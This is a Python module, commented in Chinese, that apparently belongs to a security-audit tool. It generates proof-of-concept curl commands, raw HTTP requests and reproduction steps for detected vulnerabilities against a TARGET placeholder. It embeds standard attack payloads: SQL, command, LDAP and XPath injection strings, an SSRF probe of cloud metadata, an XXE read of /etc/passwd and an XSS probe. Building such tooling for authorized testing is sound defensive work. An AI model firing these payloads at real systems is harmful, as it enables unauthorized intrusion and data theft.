"""POC 生成（PocWriter）的确定性 POC 生成器。

只生成文本工件（curl / raw HTTP / 复现步骤），从不执行。所有目标地址使用
TARGET 占位符，避免误打真实资产。
"""

from __future__ import annotations

import re
from pathlib import Path
from urllib.parse import quote

from .models import Candidate, Finding, PocPlan, Project
from .security.guard import inspect_poc_safety
from .taxonomy import meta

PLACEHOLDER = "TARGET"
BASE_URL = f"http://{PLACEHOLDER}:8080"


def _url(endpoint: str) -> str:
    endpoint = endpoint or "/"
    if not endpoint.startswith("/"):
        endpoint = "/" + endpoint
    return BASE_URL + endpoint


def _payload_for(vuln_type: str, finding_id: str) -> str:
    token = finding_id.replace("-", "")[:8]
    payloads = {
        "path_traversal": f"../../../../tmp/sunset_{token}.txt",
        "command_injection": ";id",
        "rce": ";id",
        "code_injection": ";id",
        "sql_injection": "' OR '1'='1",
        "second_order_injection": "x' OR '1'='1' -- SUNSET2O",
        "ssrf": "http://169.254.169.254/latest/meta-data/",
        "xss": "<script>alert(document.domain)</script>",
        "ssti": "{{7*7}}",
        "expression_injection": "${7*7}",
        "xxe": '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
        "deserialization": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA... (需按目标 gadget 替换)",
        "auth_bypass": "admin",
        "idor": "2",
        "file_upload": "sunset.jsp",
        "open_redirect": "//example.com",
        "ldap_injection": "*)(uid=*))(|(uid=*",
        "xpath_injection": "' or '1'='1",
        "csrf": "自动提交表单（见 poc.html）",
        "hardcoded_secret": "（仓库静态证据）",
    }
    return payloads.get(vuln_type, "SUNSET_PROBE")


def _request_for(candidate: Candidate, payload: str, finding_id: str) -> tuple[str, str, dict[str, str]]:
    """返回 (curl 命令, raw HTTP, 额外说明)。"""
    method = (candidate.http_method or "GET").upper()
    url = _url(candidate.endpoint)
    kind = (candidate.source_kind or "query").lower()
    name = candidate.source_name if candidate.source_name not in {"", "*"} else "param"
    encoded = quote(payload, safe="")
    headers: dict[str, str] = {"Accept": "*/*"}
    notes: dict[str, str] = {}

    if kind == "query" and name == "__parameter_name__":
        # 参数名注入：payload 是参数名，参数值使用能触发分支的 testcase 名。
        testcase = Path(candidate.file).stem if candidate.file else "BenchmarkTest00000"
        body = f"{encoded}={quote(testcase, safe='')}"
        if method in {"POST", "PUT", "PATCH"}:
            curl = (
                f"curl -sS -i -X {method} '{url}' \\\n"
                "  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
                f"  --data '{encoded}={quote(testcase, safe='')}'"
            )
        else:
            joiner = "&" if "?" in url else "?"
            curl = f"curl -sS -i -X {method} '{url}{joiner}{encoded}={quote(testcase, safe='')}'"
        notes["injection_point"] = f"{method} 参数名（payload 作为 name，{testcase} 作为 value）"
    elif kind == "cookie":
        headers["Cookie"] = f"{name}={encoded}"
        body = ""
        curl = f"curl -sS -i -X {method} '{url}' \\\n  -H 'Cookie: {name}={encoded}'"
        notes["injection_point"] = f"Cookie: {name}"
    elif kind == "header":
        headers[name] = encoded
        body = ""
        curl = f"curl -sS -i -X {method} '{url}' \\\n  -H '{name}: {encoded}'"
        notes["injection_point"] = f"Header: {name}"
    elif kind == "path":
        url = url.replace("{id}", encoded).replace(":id", encoded)
        body = ""
        curl = f"curl -sS -i -X {method} '{url}'"
        notes["injection_point"] = "URL path"
    elif kind == "upload":
        headers["Content-Type"] = "multipart/form-data; boundary=SUNSET"
        body = (
            "--SUNSET\r\n"
            f'Content-Disposition: form-data; name="{name}"; filename="{payload}"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n"
            "SUNSET_POC\r\n--SUNSET--\r\n"
        )
        curl = (
            f"curl -sS -i -X {method} '{url}' \\\n"
            f"  -F '{name}=@{payload};filename={payload}'"
        )
        notes["injection_point"] = "multipart filename"
    else:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        body = f"{name}={encoded}"
        if method in {"POST", "PUT", "PATCH"}:
            curl = (
                f"curl -sS -i -X {method} '{url}' \\\n"
                "  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
                f"  --data '{name}={encoded}'"
            )
        else:
            joiner = "&" if "?" in url else "?"
            curl = f"curl -sS -i -X {method} '{url}{joiner}{name}={encoded}'"
        notes["injection_point"] = f"{method} 参数 {name}"

    raw = [f"{method} {re.sub(r'^https?://[^/]+', '', url)} HTTP/1.1", f"Host: {PLACEHOLDER}:8080"]
    for key, value in headers.items():
        raw.append(f"{key}: {value}")
    if body:
        raw.append(f"Content-Length: {len(body.encode('utf-8'))}")
    raw.append("")
    raw.append(body)
    return curl, "\r\n".join(raw), notes


def _expected(vuln_type: str) -> str:
    return {
        "path_traversal": "响应出现目标文件路径；若为写操作，TARGET 上出现 testfiles 目录之外的文件；若为读操作，响应包含文件内容。",
        "command_injection": "响应出现命令回显（如 uid=、whoami 输出），或带外通道收到请求。",
        "rce": "响应/带外通道出现命令或代码执行结果。",
        "sql_injection": "布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。",
        "second_order_injection": "第二次请求的响应出现全量数据、SQL 报错或异常业务结果。",
        "ssrf": "响应返回云元数据/内网服务内容，或 TARGET 侧产生到内网的连接。",
        "xss": "响应中脚本未编码，浏览器执行并弹出 document.domain。",
        "ssti": "响应中出现 49（7*7 求值结果），证明模板表达式被执行。",
        "expression_injection": "响应中出现 49，证明表达式被执行。",
        "xxe": "响应包含 /etc/passwd 内容，或 TARGET 发起外部实体请求。",
        "deserialization": "触发反序列化 gadget，出现命令回显/带外回调/异常堆栈。",
        "auth_bypass": "以未授权/伪造身份访问受保护资源返回 2xx。",
        "idor": "使用其他对象 ID 返回他人数据或执行他人操作。",
        "file_upload": "上传文件可访问/解析，返回 webshell 执行结果。",
        "open_redirect": "响应 30x 且 Location 指向攻击者控制的域名。",
        "ldap_injection": "认证被绕过或返回超出预期的目录条目。",
        "xpath_injection": "XPath 条件恒真，返回全部节点/认证绕过。",
        "csrf": "受害者在已登录状态下自动提交表单，服务端接受状态变更。",
        "hardcoded_secret": "仓库中可直接读取到有效凭据；需人工确认有效性。",
        "weak_crypto": "静态证据：使用 MD5/SHA1/DES/ECB 等弱算法。",
        "weak_random": "静态证据：使用非密码学安全随机数。",
    }.get(vuln_type, "按漏洞类型观察相应的异常响应/副作用。")


def build_poc(candidate: Candidate, project: Project, finding_id: str) -> PocPlan:
    vuln_type = candidate.vuln_type
    item = meta(vuln_type)
    payload = _payload_for(vuln_type, finding_id)
    # Runtime.exec(args, env)：注入点是环境变量数组，不是普通命令行参数。
    if vuln_type == "command_injection" and "argsEnv" in (candidate.code_snippet or ""):
        payload = "FOO=echo SUNSET_CMD_MARKER"

    if candidate.source_kind in {"config", "repository"} or vuln_type in {"hardcoded_secret", "weak_crypto", "weak_random"}:
        description = f"静态证据型 POC：在 `{candidate.file}:{candidate.line_end}` 记录问题，无需发送请求。"
        steps = [
            {"step": 1, "action": "在源码中定位证据", "request": f"grep -n -A2 -B2 '<evidence>' {candidate.file}",
             "expected_response": "命中硬编码凭据/弱算法/弱随机数调用"},
            {"step": 2, "action": "人工确认凭据有效性或算法使用场景", "request": "（离线审查）",
             "expected_response": "确认凭据仍有效或算法保护敏感数据"},
        ]
        scripts = {
            "poc_readme.md": f"# 静态证据\n\n- 文件: {candidate.file}\n- 行号: {candidate.line_end}\n- 片段:\n```\n{candidate.code_snippet}\n```\n",
        }
        plan = PocPlan(description=description, preconditions=["可读取源码"], steps=steps,
                       payload=payload, impact="硬编码凭据/弱算法可导致凭据泄露或加密数据被破解。",
                       cve_justification=f"符合 {item.cwe}；需结合部署与数据敏感度确认 CVE 价值。",
                       scripts=scripts)
        plan.safety = inspect_poc_safety(scripts, payload)
        return plan

    curl, raw, notes = _request_for(candidate, payload, finding_id)
    expected = _expected(vuln_type)
    description = (
        f"针对 {candidate.endpoint}（{candidate.http_method}）的 {item.label_zh} POC。"
        f"注入点：{notes.get('injection_point', '请求参数')}；payload 使用 TARGET 占位符。"
    )
    steps = [
        {"step": 1, "action": "确认目标可达且已获授权", "request": f"curl -sS -i '{_url(candidate.endpoint)}'",
         "expected_response": "返回应用页面/接口响应，而不是连接失败"},
        {"step": 2, "action": f"发送 {item.label_zh} 载荷", "request": curl, "expected_response": expected},
        {"step": 3, "action": "记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道",
         "request": "",
         "expected_response": "出现与基线不同的内容、状态码、延迟或副作用"},
    ]
    scripts = {
        "poc.sh": "#!/usr/bin/env sh\nset -eu\n# 仅限授权测试；替换 TARGET 后手动执行\n" + curl + "\n",
        "request.http": raw + "\n",
    }
    impact = {
        "path_traversal": "攻击者可读取敏感文件或写入/覆盖任意文件，可能导致凭据泄露、配置篡改乃至 RCE。",
        "command_injection": "攻击者可在应用服务器上执行任意系统命令，完全接管主机。",
        "sql_injection": "攻击者可读取/篡改数据库、绕过认证，造成大规模数据泄露。",
        "ssrf": "攻击者可访问内网服务与云元数据，横向移动或窃取凭据。",
        "xss": "攻击者可在受害者浏览器执行脚本，窃取会话或发起敏感操作。",
        "xxe": "攻击者可读取服务器文件或发起 SSRF。",
        "deserialization": "攻击者可能通过 gadget 链实现远程代码执行。",
        "ssti": "攻击者可执行模板表达式，通常可升级为 RCE。",
        "auth_bypass": "攻击者可绕过认证，获得未授权访问。",
        "idor": "攻击者可访问/修改其他用户的对象。",
        "file_upload": "攻击者可上传可执行文件，可能导致 RCE。",
        "open_redirect": "攻击者可构造可信域名的钓鱼跳转。",
        "ldap_injection": "攻击者可绕过 LDAP 认证或读取目录数据。",
        "xpath_injection": "攻击者可绕过 XPath 认证或读取 XML 数据。",
    }.get(vuln_type, "该问题可导致未授权访问、数据泄露或业务逻辑被绕过。")
    plan = PocPlan(
        description=description,
        preconditions=[
            "目标应用已部署且路由可达",
            f"入口 {candidate.endpoint} 使用 {candidate.http_method}",
            "测试已获得明确授权，且仅使用 TARGET 占位符",
        ],
        steps=steps,
        payload=payload,
        impact=impact,
        cve_justification=(
            f"符合 {item.cwe}。漏洞位于可交付代码 {candidate.file}:{candidate.line_end}，"
            f"外部输入来自 {candidate.source_kind} `{candidate.source_name}`，"
            "source→sink 链已静态闭合，且未发现有效净化；具备远程触发条件。"
        ),
        scripts=scripts,
    )
    plan.safety = inspect_poc_safety(scripts, payload)
    return plan


def build_poc_for_finding(finding: Finding, project: Project, finding_id: str | None = None) -> PocPlan:
    """Finding 与 Candidate 字段兼容适配。"""
    candidate = Candidate(
        candidate_id=finding.finding_id,
        vuln_type=finding.vulnerability_type,
        file=finding.file_path,
        line_start=finding.line_start,
        line_end=finding.line_end,
        rule_id="finding",
        sink=finding.sink,
        source_kind=_source_kind_from_finding(finding),
        source_name=_source_name_from_finding(finding),
        endpoint=finding.endpoint or _endpoint_from_finding(finding),
        http_method=finding.http_method or _method_from_finding(finding),
        code_snippet=finding.code_snippet,
        tainted_expression=finding.source,
        chain=finding.exploit_chain,
        severity=finding.severity,
        confidence=finding.confidence,
    )
    return build_poc(candidate, project, finding_id or finding.finding_id)


def _source_kind_from_finding(finding: Finding) -> str:
    text = (finding.source or "").lower()
    for kind in ("cookie", "header", "query", "body", "path", "upload", "session", "config", "repository"):
        if text.startswith(kind) or f" {kind} " in text or f"{kind} `" in text:
            return kind
    return "query"


def _source_name_from_finding(finding: Finding) -> str:
    match = re.search(r"`([^`]+)`", finding.source or "")
    return match.group(1) if match else "param"


def _endpoint_from_finding(finding: Finding) -> str:
    match = re.search(
        r"(?:GET|POST|PUT|DELETE|PATCH|ANY)\b[^\n]{0,40}?(/[A-Za-z0-9_./{}:+-]+)",
        finding.cve_justification or "",
    )
    if match:
        return match.group(1).rstrip("，,。.")
    return "/"


def _method_from_finding(finding: Finding) -> str:
    match = re.search(r"\b(GET|POST|PUT|DELETE|PATCH)\b", finding.cve_justification or "")
    return match.group(1) if match else "GET"


def build_second_order_poc(chain, project: Project) -> PocPlan:
    if chain.poc is not None:
        return chain.poc
    from .second_order import _poc_plan  # 延迟导入避免循环
    return _poc_plan(chain, project)
